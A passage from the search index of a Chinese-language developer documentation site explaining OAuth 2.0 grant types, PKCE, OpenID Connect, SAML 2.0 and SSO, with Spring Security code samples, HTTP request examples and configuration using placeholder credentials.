\u914d\u7f6e\u6388\u6743\u548cToken\u7aef\u70b9\n     */\n    @Override\n    public void configure(AuthorizationServerEndpointsConfigurer endpoints) {\n        endpoints\n            .authenticationManager(authenticationManager)\n            .userDetailsService(userDetailsService)\n            .tokenStore(tokenStore())\n            .accessTokenConverter(accessTokenConverter());\n    }\n\n    /**\n     * Token\u5b58\u50a8\uff08\u4f7f\u7528JWT\uff09\n     */\n    @Bean\n    public TokenStore tokenStore() {\n        return new JwtTokenStore(accessTokenConverter());\n    }\n\n    /**\n     * JWT Token\u8f6c\u6362\u5668\n     */\n    @Bean\n    public JwtAccessTokenConverter accessTokenConverter() {\n        JwtAccessTokenConverter converter = new JwtAccessTokenConverter();\n        converter.setSigningKey(\"jwt-secret-key\"); // \u751f\u4ea7\u73af\u5883\u4f7f\u7528\u975e\u5bf9\u79f0\u5bc6\u94a5\n        return converter;\n    }\n}\n\n/**\n * \u8d44\u6e90\u670d\u52a1\u5668\u914d\u7f6e\n */\n@Configuration\n@EnableResourceServer\npublic class ResourceServerConfig extends ResourceServerConfigurerAdapter {\n\n    @Override\n    public void configure(HttpSecurity http) throws Exception {\n        http\n            .authorizeRequests()\n            .antMatchers(\"/api/public/**\").permitAll()\n            .antMatchers(\"/api/**\").authenticated();\n    }\n\n    @Override\n    public void configure(ResourceServerSecurityConfigurer resources) {\n        resources.tokenStore(tokenStore());\n    }\n}\n</code></pre> <p>\u5ba2\u6237\u7aef\u5b9e\u73b0\uff1a <pre><code>/**\n * OAuth2\u5ba2\u6237\u7aef\u914d\u7f6e\n */\n@Configuration\npublic class OAuth2ClientConfig {\n\n    @Bean\n    public OAuth2RestTemplate oauth2RestTemplate(OAuth2ClientContext context) {\n        return new OAuth2RestTemplate(resourceDetails(), context);\n    }\n\n    @Bean\n    public OAuth2ProtectedResourceDetails resourceDetails() {\n        AuthorizationCodeResourceDetails details = new AuthorizationCodeResourceDetails();\n        details.setClientId(\"client-app\");\n        details.setClientSecret(\"client-secret\");\n        details.setAccessTokenUri(\"https://auth.example.com/oauth/token\");\n        details.setUserAuthorizationUri(\"https://auth.example.com/oauth/authorize\");\n        details.setScope(Arrays.asList(\"read\", \"write\"));\n        return details;\n    }\n}\n\n/**\n * \u4f7f\u7528OAuth2\u8c03\u7528API\n */\n@Service\npublic class UserService {\n\n    @Autowired\n    private OAuth2RestTemplate restTemplate;\n\n    public UserProfile getUserProfile() {\n        String url = \"https://api.example.com/user/profile\";\n        return restTemplate.getForObject(url, UserProfile.class);\n    }\n}\n</code></pre></p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#2-implicit","title":"2. \u9690\u5f0f\u6a21\u5f0f\uff08Implicit\uff09","text":"<p>\u9002\u7528\u4e8e\u7eaf\u524d\u7aef\u5e94\u7528\uff08SPA\uff09\uff0c\u5df2\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u5efa\u8bae\u4f7f\u7528\u6388\u6743\u7801\u6a21\u5f0f+PKCE\u3002</p> <p>\u6d41\u7a0b\uff1a <pre><code># 1. \u8bf7\u6c42\u6388\u6743\uff08\u6ce8\u610fresponse_type=token\uff09\nGET /oauth/authorize?\n    response_type=token&amp;\n    client_id=CLIENT_ID&amp;\n    redirect_uri=https://client.com/callback&amp;\n    scope=read&amp;\n    state=random_state\n\n# 2. \u76f4\u63a5\u8fd4\u56deAccess Token\uff08\u5728URL Fragment\u4e2d\uff09\nHTTP/1.1 302 Found\nLocation: https://client.com/callback#\n    access_token=ACCESS_TOKEN&amp;\n    token_type=Bearer&amp;\n    expires_in=3600&amp;\n    state=random_state\n</code></pre></p> <p>\u5b89\u5168\u95ee\u9898\uff1a - Token\u66b4\u9732\u5728URL\u4e2d\uff0c\u5bb9\u6613\u6cc4\u9732 - \u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u53ef\u80fd\u8bb0\u5f55Token - \u65e0\u6cd5\u4f7f\u7528client_secret\uff08\u524d\u7aef\u4ee3\u7801\u53ef\u89c1\uff09</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#3-resource-owner-password-credentials","title":"3. \u5bc6\u7801\u6a21\u5f0f\uff08Resource Owner Password Credentials\uff09","text":"<p>\u7528\u6237\u76f4\u63a5\u5c06\u7528\u6237\u540d\u5bc6\u7801\u63d0\u4f9b\u7ed9\u5ba2\u6237\u7aef\uff0c\u4ec5\u9002\u7528\u4e8e\u9ad8\u5ea6\u4fe1\u4efb\u7684\u5e94\u7528\u3002</p> <pre><code>POST /oauth/token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=password&amp;\nusername=user@example.com&amp;\npassword=userpassword&amp;\nclient_id=CLIENT_ID&amp;\nclient_secret=CLIENT_SECRET&amp;\nscope=read write\n</code></pre> <pre><code>/**\n * \u5bc6\u7801\u6a21\u5f0f\u5b9e\u73b0\n */\n@RestController\npublic class TokenController {\n\n    @PostMapping(\"/oauth/token\")\n    public TokenResponse getToken(@RequestParam(\"grant_type\") String grantType,\n                                  @RequestParam(\"username\") String username,\n                                  @RequestParam(\"password\") String password) {\n\n        if (!\"password\".equals(grantType)) {\n            throw new UnsupportedGrantTypeException();\n        }\n\n        // \u9a8c\u8bc1\u7528\u6237\u540d\u5bc6\u7801\n        User user = userService.authenticate(username, password);\n        if (user == null) {\n            throw new InvalidCredentialsException();\n        }\n\n        // \u751f\u6210Token\n        String accessToken = tokenService.generateAccessToken(user);\n        String refreshToken = tokenService.generateRefreshToken(user);\n\n        return TokenResponse.builder()\n            .accessToken(accessToken)\n            .tokenType(\"Bearer\")\n            .expiresIn(3600)\n            .refreshToken(refreshToken)\n            .build();\n    }\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#4-client-credentials","title":"4. \u5ba2\u6237\u7aef\u6a21\u5f0f\uff08Client Credentials\uff09","text":"<p>\u9002\u7528\u4e8e\u670d\u52a1\u5668\u5230\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff0c\u4e0d\u6d89\u53ca\u7528\u6237\u3002</p> <pre><code>POST /oauth/token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials&amp;\nclient_id=CLIENT_ID&amp;\nclient_secret=CLIENT_SECRET&amp;\nscope=api_access\n</code></pre> <pre><code>/**\n * \u5ba2\u6237\u7aef\u6a21\u5f0f\u5b9e\u73b0\n */\n@Service\npublic class ClientCredentialsService {\n\n    public String getServiceAccessToken(String clientId, String clientSecret) {\n        // \u9a8c\u8bc1\u5ba2\u6237\u7aef\u51ed\u8bc1\n        Client client = clientRepository.findByClientId(clientId);\n        if (client == null || !client.checkSecret(clientSecret)) {\n            throw new InvalidClientException();\n        }\n\n        // \u751f\u6210Token\uff08\u4e0d\u5305\u542b\u7528\u6237\u4fe1\u606f\uff09\n        return Jwts.builder()\n            .setSubject(clientId)\n            .setIssuedAt(new Date())\n            .setExpiration(new Date(System.currentTimeMillis() + 3600000))\n            .claim(\"client_id\", clientId)\n            .claim(\"scope\", client.getScopes())\n            .signWith(key)\n            .compact();\n    }\n}\n\n/**\n * \u5fae\u670d\u52a1\u95f4\u8c03\u7528\u793a\u4f8b\n */\n@Service\npublic class OrderService {\n\n    @Autowired\n    private RestTemplate restTemplate;\n\n    public Inventory checkInventory(String productId) {\n        // \u83b7\u53d6\u670d\u52a1\u8bbf\u95eeToken\n        String token = oauth2Client.getClientCredentialsToken();\n\n        // \u8c03\u7528\u5e93\u5b58\u670d\u52a1\n        HttpHeaders headers = new HttpHeaders();\n        headers.setBearerAuth(token);\n        HttpEntity&lt;String&gt; entity = new HttpEntity&lt;&gt;(headers);\n\n        ResponseEntity&lt;Inventory&gt; response = restTemplate.exchange(\n            \"https://inventory-service/api/products/\" + productId,\n            HttpMethod.GET,\n            entity,\n            Inventory.class\n        );\n\n        return response.getBody();\n    }\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#pkceproof-key-for-code-exchange","title":"PKCE\u6269\u5c55\uff08Proof Key for Code Exchange\uff09","text":"<p>\u89e3\u51b3\u95ee\u9898\uff1a \u589e\u5f3a\u6388\u6743\u7801\u6a21\u5f0f\u7684\u5b89\u5168\u6027\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u65e0\u6cd5\u5b89\u5168\u5b58\u50a8client_secret\u7684\u516c\u5171\u5ba2\u6237\u7aef\uff08\u79fb\u52a8\u5e94\u7528\u3001SPA\uff09\u3002</p> <p>\u6d41\u7a0b\uff1a <pre><code>1. \u5ba2\u6237\u7aef\u751f\u6210code_verifier\uff08\u968f\u673a\u5b57\u7b26\u4e32\uff09\n2. \u5ba2\u6237\u7aef\u8ba1\u7b97code_challenge = BASE64URL(SHA256(code_verifier))\n3. \u8bf7\u6c42\u6388\u6743\u65f6\u643a\u5e26code_challenge\n4. \u7528\u6388\u6743\u7801\u6362Token\u65f6\u643a\u5e26code_verifier\n5. \u670d\u52a1\u5668\u9a8c\u8bc1\uff1aSHA256(code_verifier) == code_challenge\n</code></pre></p> <pre><code>/**\n * PKCE\u5b9e\u73b0\n */\npublic class PKCEHelper {\n\n    /**\n     * \u751f\u6210Code Verifier\n     */\n    public static String generateCodeVerifier() {\n        SecureRandom random = new SecureRandom();\n        byte[] bytes = new byte[32];\n        random.nextBytes(bytes);\n        return Base64.getUrlEncoder()\n            .withoutPadding()\n            .encodeToString(bytes);\n    }\n\n    /**\n     * \u751f\u6210Code Challenge\n     */\n    public static String generateCodeChallenge(String codeVerifier) {\n        try {\n            MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n            byte[] hash = digest.digest(codeVerifier.getBytes(StandardCharsets.UTF_8));\n            return Base64.getUrlEncoder()\n                .withoutPadding()\n                .encodeToString(hash);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n\n// \u8bf7\u6c42\u6388\u6743\nString codeVerifier = PKCEHelper.generateCodeVerifier();\nString codeChallenge = PKCEHelper.generateCodeChallenge(codeVerifier);\n\nString authorizeUrl = \"https://auth.example.com/oauth/authorize?\" +\n    \"response_type=code&amp;\" +\n    \"client_id=CLIENT_ID&amp;\" +\n    \"redirect_uri=https://app.com/callback&amp;\" +\n    \"code_challenge=\" + codeChallenge + \"&amp;\" +\n    \"code_challenge_method=S256\";\n\n// \u6362\u53d6Token\u65f6\u643a\u5e26code_verifier\nPOST /oauth/token\ngrant_type=authorization_code&amp;\ncode=AUTHORIZATION_CODE&amp;\nclient_id=CLIENT_ID&amp;\nredirect_uri=https://app.com/callback&amp;\ncode_verifier=CODE_VERIFIER\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#openid-connect-oidc","title":"OpenID Connect (OIDC)","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#oidc","title":"OIDC\u6982\u8ff0","text":"<p>OpenID Connect (OIDC) \u662f\u57fa\u4e8eOAuth 2.0\u7684\u8eab\u4efd\u8ba4\u8bc1\u5c42\uff0c\u89e3\u51b3\"\u7528\u6237\u662f\u8c01\"\u7684\u95ee\u9898\u3002</p> <p>OAuth 2.0 vs OIDC: - OAuth 2.0: \u6388\u6743\u534f\u8bae\uff08\u4f60\u80fd\u505a\u4ec0\u4e48\uff09 - OIDC: \u8ba4\u8bc1\u534f\u8bae\uff08\u4f60\u662f\u8c01\uff09+ \u6388\u6743</p> <p>\u6838\u5fc3\u6982\u5ff5\uff1a - ID Token: JWT\u683c\u5f0f\uff0c\u5305\u542b\u7528\u6237\u8eab\u4efd\u4fe1\u606f - UserInfo Endpoint: \u83b7\u53d6\u7528\u6237\u8be6\u7ec6\u4fe1\u606f\u7684\u7aef\u70b9 - Standard Claims: \u6807\u51c6\u5316\u7684\u7528\u6237\u5c5e\u6027</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#oidc_1","title":"OIDC\u6d41\u7a0b","text":"<pre><code>1. \u5ba2\u6237\u7aef\u8bf7\u6c42\u6388\u6743\uff08scope\u5305\u542bopenid\uff09\n2. \u7528\u6237\u8ba4\u8bc1\u5e76\u6388\u6743\n3. \u8fd4\u56de\u6388\u6743\u7801\n4. \u5ba2\u6237\u7aef\u7528\u6388\u6743\u7801\u6362\u53d6Token\n5. \u670d\u52a1\u5668\u8fd4\u56de: Access Token + ID Token\n6. \u5ba2\u6237\u7aef\u9a8c\u8bc1ID Token\n7. \uff08\u53ef\u9009\uff09\u4f7f\u7528Access Token\u8c03\u7528UserInfo\u63a5\u53e3\u83b7\u53d6\u66f4\u591a\u7528\u6237\u4fe1\u606f\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#id-token","title":"ID Token\u7ed3\u6784","text":"<pre><code>{\n  // \u6807\u51c6\u58f0\u660e\n  \"iss\": \"https://auth.example.com\",          // \u7b7e\u53d1\u8005\n  \"sub\": \"user123\",                            // \u7528\u6237\u552f\u4e00\u6807\u8bc6\n  \"aud\": \"client-app\",                         // \u53d7\u4f17\uff08\u5ba2\u6237\u7aefID\uff09\n  \"exp\": 1735689600,                           // \u8fc7\u671f\u65f6\u95f4\n  \"iat\": 1735686000,                           // \u7b7e\u53d1\u65f6\u95f4\n  \"auth_time\": 1735685900,                     // \u7528\u6237\u8ba4\u8bc1\u65f6\u95f4\n  \"nonce\": \"random-nonce\",                     // \u9632\u91cd\u653e\u653b\u51fb\n  \"acr\": \"urn:mace:incommon:iap:silver\",      // \u8ba4\u8bc1\u4e0a\u4e0b\u6587\u7c7b\n  \"amr\": [\"pwd\", \"mfa\"],                       // \u8ba4\u8bc1\u65b9\u6cd5\n  \"azp\": \"client-app\",                         // \u6388\u6743\u65b9\n\n  // \u6807\u51c6\u7528\u6237\u58f0\u660e\n  \"name\": \"Zhang San\",\n  \"given_name\": \"San\",\n  \"family_name\": \"Zhang\",\n  \"middle_name\": \"\",\n  \"nickname\": \"zhangsan\",\n  \"preferred_username\": \"zhangsan\",\n  \"profile\": \"https://example.com/profile/zhangsan\",\n  \"picture\": \"https://example.com/avatar/zhangsan.jpg\",\n  \"website\": \"https://zhangsan.blog\",\n  \"email\": \"zhangsan@example.com\",\n  \"email_verified\": true,\n  \"gender\": \"male\",\n  \"birthdate\": \"1990-01-01\",\n  \"zoneinfo\": \"Asia/Shanghai\",\n  \"locale\": \"zh-CN\",\n  \"phone_number\": \"+86 138 0000 0000\",\n  \"phone_number_verified\": true,\n  \"address\": {\n    \"formatted\": \"\u5317\u4eac\u5e02\u671d\u9633\u533a\u67d0\u67d0\u8def123\u53f7\",\n    \"street_address\": \"\u67d0\u67d0\u8def123\u53f7\",\n    \"locality\": \"\u671d\u9633\u533a\",\n    \"region\": \"\u5317\u4eac\u5e02\",\n    \"postal_code\": \"100000\",\n    \"country\": \"CN\"\n  },\n  \"updated_at\": 1735686000\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#scope","title":"Scope\u8bf4\u660e","text":"<pre><code>openid           - \u5fc5\u9700\uff0c\u8868\u793a\u4f7f\u7528OIDC\nprofile          - \u57fa\u672c\u8d44\u6599\uff08name, picture\u7b49\uff09\nemail            - \u7535\u5b50\u90ae\u4ef6\naddress          - \u5730\u5740\nphone            - \u7535\u8bdd\u53f7\u7801\noffline_access   - \u83b7\u53d6Refresh Token\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#javaspring-security-oauth2","title":"Java\u5b9e\u73b0\uff08\u4f7f\u7528Spring Security OAuth2\uff09","text":"<pre><code>/**\n * OIDC\u63d0\u4f9b\u8005\u914d\u7f6e\n */\n@Configuration\npublic class OIDCProviderConfig {\n\n    /**\n     * \u914d\u7f6eOIDC\u7aef\u70b9\n     */\n    @Bean\n    public OAuth2AuthorizationServerConfigurer authorizationServerConfigurer() {\n        return new OAuth2AuthorizationServerConfigurer()\n            .oidc(oidc -&gt; oidc\n                .userInfoEndpoint(\"/oidc/userinfo\")\n                .clientRegistrationEndpoint(\"/oidc/register\")\n            );\n    }\n\n    /**\n     * UserInfo\u7aef\u70b9\u5b9e\u73b0\n     */\n    @RestController\n    public class UserInfoController {\n\n        @GetMapping(\"/oidc/userinfo\")\n        public Map&lt;String, Object&gt; userInfo(Authentication authentication) {\n            OAuth2Authentication oauth2Auth = (OAuth2Authentication) authentication;\n            String username = oauth2Auth.getName();\n            User user = userService.findByUsername(username);\n\n            Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();\n            claims.put(\"sub\", user.getId());\n            claims.put(\"name\", user.getName());\n            claims.put(\"email\", user.getEmail());\n            claims.put(\"email_verified\", user.isEmailVerified());\n            claims.put(\"picture\", user.getAvatarUrl());\n\n            return claims;\n        }\n    }\n}\n\n/**\n * OIDC\u5ba2\u6237\u7aef\u914d\u7f6e\uff08Spring Boot 2.x/3.x\uff09\n */\n@Configuration\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/\", \"/login/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .oauth2Login(oauth2 -&gt; oauth2\n                .userInfoEndpoint(userInfo -&gt; userInfo\n                    .oidcUserService(oidcUserService())\n                )\n            );\n\n        return http.build();\n    }\n\n    /**\n     * \u81ea\u5b9a\u4e49OIDC\u7528\u6237\u670d\u52a1\n     */\n    @Bean\n    public OidcUserService oidcUserService() {\n        OidcUserService delegate = new OidcUserService();\n\n        return (userRequest) -&gt; {\n            OidcUser oidcUser = delegate.loadUser(userRequest);\n\n            // \u81ea\u5b9a\u4e49\u5904\u7406\uff1a\u540c\u6b65\u7528\u6237\u5230\u672c\u5730\u6570\u636e\u5e93\n            syncUserToDatabase(oidcUser);\n\n            return oidcUser;\n        };\n    }\n}\n\n/**\n * \u4f7f\u7528OIDC\u4fe1\u606f\n */\n@Controller\npublic class ProfileController {\n\n    @GetMapping(\"/profile\")\n    public String profile(Model model, @AuthenticationPrincipal OidcUser oidcUser) {\n        // \u4eceID Token\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n        String name = oidcUser.getName();\n        String email = oidcUser.getEmail();\n        String picture = oidcUser.getPicture();\n\n        // \u8bbf\u95ee\u6240\u6709claims\n        Map&lt;String, Object&gt; claims = oidcUser.getClaims();\n\n        // ID Token\n        OidcIdToken idToken = oidcUser.getIdToken();\n        String tokenValue = idToken.getTokenValue();\n\n        model.addAttribute(\"name\", name);\n        model.addAttribute(\"email\", email);\n        model.addAttribute(\"picture\", picture);\n\n        return \"profile\";\n    }\n}\n</code></pre> <p>application.yml\u914d\u7f6e\uff1a <pre><code>spring:\n  security:\n    oauth2:\n      client:\n        registration:\n          google:\n            client-id: YOUR_CLIENT_ID\n            client-secret: YOUR_CLIENT_SECRET\n            scope:\n              - openid\n              - profile\n              - email\n        provider:\n          google:\n            issuer-uri: https://accounts.google.com\n            # \u6216\u624b\u52a8\u914d\u7f6e\u7aef\u70b9\n            # authorization-uri: https://accounts.google.com/o/oauth2/v2/auth\n            # token-uri: https://oauth2.googleapis.com/token\n            # user-info-uri: https://openidconnect.googleapis.com/v1/userinfo\n            # jwk-set-uri: https://www.googleapis.com/oauth2/v3/certs\n</code></pre></p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#saml-20","title":"SAML 2.0","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#saml","title":"SAML\u6982\u8ff0","text":"<p>SAML (Security Assertion Markup Language) \u662f\u57fa\u4e8eXML\u7684\u4f01\u4e1a\u7ea7\u5355\u70b9\u767b\u5f55\uff08SSO\uff09\u6807\u51c6\uff0c\u4e3b\u8981\u7528\u4e8e\u4f01\u4e1a\u73af\u5883\u3002</p> <p>\u6838\u5fc3\u6982\u5ff5\uff1a - Identity Provider (IdP): \u8eab\u4efd\u63d0\u4f9b\u8005\uff08\u5982Active Directory\u3001Okta\uff09 - Service Provider (SP): \u670d\u52a1\u63d0\u4f9b\u8005\uff08\u5e94\u7528\uff09 - Assertion: XML\u683c\u5f0f\u7684\u8eab\u4efd\u65ad\u8a00</p> <p>SAML vs OAuth/OIDC: - SAML: \u4f01\u4e1a\u7ea7\u3001XML\u3001\u91cd\u91cf\u7ea7\u3001SSO - OAuth/OIDC: \u4e92\u8054\u7f51\u3001JSON\u3001\u8f7b\u91cf\u7ea7\u3001API\u8bbf\u95ee</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#samlsp-initiated","title":"SAML\u6d41\u7a0b\uff08SP-Initiated\uff09","text":"<pre><code>\u7528\u6237              \u670d\u52a1\u63d0\u4f9b\u8005(SP)    \u8eab\u4efd\u63d0\u4f9b\u8005(IdP)\n \u2502                    \u2502                  \u2502\n \u2502 1. \u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90   \u2502                  \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                  \u2502\n \u2502                    \u2502 2. \u751f\u6210SAML\u8bf7\u6c42   \u2502\n \u2502                    \u2502  \u91cd\u5b9a\u5411\u5230IdP     \u2502\n \u2502                    \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502\n \u2502 3. \u7528\u6237\u767b\u5f55IdP     \u2502                  \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502\n \u2502                    \u2502 4. IdP\u751f\u6210SAML\u65ad\u8a00\u2502\n \u2502                    \u2502  \u91cd\u5b9a\u5411\u56deSP       \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n \u2502 5. SP\u9a8c\u8bc1\u65ad\u8a00      \u2502                  \u2502\n \u2502   \u521b\u5efa\u672c\u5730\u4f1a\u8bdd     \u2502                  \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                  \u2502\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#javaspring-security-saml","title":"Java\u5b9e\u73b0\uff08\u4f7f\u7528Spring Security SAML\uff09","text":"<pre><code>&lt;!-- Maven\u4f9d\u8d56 --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.security.extensions&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-security-saml2-core&lt;/artifactId&gt;\n    &lt;version&gt;1.0.10.RELEASE&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>/**\n * SAML\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class SAMLConfig extends WebSecurityConfigurerAdapter {\n\n    @Value(\"${saml.idp.metadata.url}\")\n    private String idpMetadataUrl;\n\n    @Value(\"${saml.sp.entity-id}\")\n    private String spEntityId;\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http\n            .authorizeRequests()\n                .antMatchers(\"/saml/**\").permitAll()\n                .anyRequest().authenticated()\n            .and()\n            .apply(saml());\n    }\n\n    /**\n     * SAML\u914d\u7f6e\u5668\n     */\n    private SAMLConfigurer saml() {\n        return new SAMLConfigurer()\n            .serviceProvider(sp -&gt; sp\n                .entityId(spEntityId)\n                .signRequests(true)\n                .wantAssertionsSigned(true)\n            )\n            .identityProvider(idp -&gt; idp\n                .metadataUrl(idpMetadataUrl)\n            );\n    }\n\n    /**\n     * SAML\u8ba4\u8bc1\u6210\u529f\u5904\u7406\u5668\n     */\n    @Bean\n    public SAMLAuthenticationSuccessHandler successHandler() {\n        return (request, response, authentication) -&gt; {\n            SAMLCredential credential = (SAMLCredential) authentication.getCredentials();\n\n            // \u83b7\u53d6\u7528\u6237\u5c5e\u6027\n            String nameID = credential.getNameID().getValue();\n            String email = credential.getAttributeAsString(\"email\");\n            String displayName = credential.getAttributeAsString(\"displayName\");\n\n            // \u521b\u5efa\u672c\u5730\u7528\u6237\n            User user = userService.findOrCreateUser(nameID, email, displayName);\n\n            // \u91cd\u5b9a\u5411\u5230\u4e3b\u9875\n            response.sendRedirect(\"/home\");\n        };\n    }\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#sso","title":"\u5355\u70b9\u767b\u5f55(SSO)","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#sso_1","title":"SSO\u6982\u8ff0","text":"<p>\u5355\u70b9\u767b\u5f55\uff08Single Sign-On\uff09 \u5141\u8bb8\u7528\u6237\u4f7f\u7528\u4e00\u7ec4\u51ed\u8bc1\u767b\u5f55\u591a\u4e2a\u76f8\u5173\u4f46\u72ec\u7acb\u7684\u5e94\u7528\u7cfb\u7edf\u3002</p> <p>\u4f18\u70b9\uff1a - \u7528\u6237\u4f53\u9a8c\u597d\uff08\u4e00\u6b21\u767b\u5f55\uff0c\u591a\u5904\u4f7f\u7528\uff09 - \u51cf\u5c11\u5bc6\u7801\u75b2\u52b3 - \u96c6\u4e2d\u7684\u8bbf\u95ee\u63a7\u5236 - \u7edf\u4e00\u7684\u5b89\u5168\u7b56\u7565</p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#sso_2","title":"SSO\u5b9e\u73b0\u65b9\u5f0f","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#1-cookiesso","title":"1. \u57fa\u4e8eCookie\u7684SSO\uff08\u540c\u57df\uff09","text":"<pre><code>\u4e3b\u57df\u540d: example.com\n\u5b50\u7cfb\u7edf: app1.example.com, app2.example.com, app3.example.com\n\n\u5b9e\u73b0: \u8bbe\u7f6eCookie\u7684Domain\u4e3a.example.com\n</code></pre> <pre><code>// SSO\u670d\u52a1\u5668\u767b\u5f55\u6210\u529f\u540e\nCookie ssoCookie = new Cookie(\"SSO_TOKEN\", ssoToken);\nssoCookie.setDomain(\".example.com\");  // \u6240\u6709\u5b50\u57df\u540d\u53ef\u8bbf\u95ee\nssoCookie.setPath(\"/\");\nssoCookie.setHttpOnly(true);\nssoCookie.setSecure(true);\nssoCookie.setMaxAge(3600);\nresponse.addCookie(ssoCookie);\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#2-cas-central-authentication-service","title":"2. CAS (Central Authentication Service)","text":"<p>CAS\u534f\u8bae\u6d41\u7a0b\uff1a <pre><code>\u7528\u6237           \u5e94\u7528A              CAS\u670d\u52a1\u5668           \u5e94\u7528B\n \u2502               \u2502                    \u2502                 \u2502\n \u2502 1. \u8bbf\u95eeA      \u2502                    \u2502                 \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                    \u2502                 \u2502\n \u2502               \u2502 2. \u91cd\u5b9a\u5411\u5230CAS     \u2502                 \u2502\n \u2502               \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                 \u2502\n \u2502 3. \u7528\u6237\u767b\u5f55   \u2502                    \u2502                 \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                 \u2502\n \u2502               \u2502 4. \u8fd4\u56deTGT/TGC     \u2502                 \u2502\n \u2502               \u2502    \u91cd\u5b9a\u5411\u56deA(\u5e26ST)  \u2502                 